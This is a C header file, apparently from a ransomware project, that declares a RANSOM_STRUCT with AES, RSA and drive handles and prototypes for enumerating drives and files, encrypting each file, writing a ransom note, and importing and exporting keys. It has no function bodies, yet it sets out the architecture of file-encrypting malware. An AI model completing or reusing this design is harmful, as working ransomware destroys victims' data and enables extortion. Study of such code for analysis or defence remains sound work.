#ifndef __MAIN_H__
#define __MAIN_H__

#include "config.h"

typedef struct
{
	WCHAR *RootPathName;
	CONST WCHAR *hRSAKeyStr;
	BOOL   bUnknown;
	HCRYPTPROV hProv;
	HCRYPTKEY  hAESKey;
	HCRYPTKEY  hRSAKey;
	HANDLE hDriveHandle;
} RANSOM_STRUCT;

DWORD WINAPI enum_drive(LPVOID lpParam);
BOOL gen_aes_key(RANSOM_STRUCT *crypto_struct);
VOID enum_files(WCHAR *zePath, int recursion_count, RANSOM_STRUCT *crypto_struct);
VOID encrypt_file(WCHAR *zeFile, RANSOM_STRUCT *crypto_struct);
VOID write_note(RANSOM_STRUCT *crypto_struct);
BOOL import_rsa_key(RANSOM_STRUCT *crypto_struct);
WCHAR *export_aes_key(RANSOM_STRUCT *crypto_struct);
DWORD GetRandomNumber();

#endif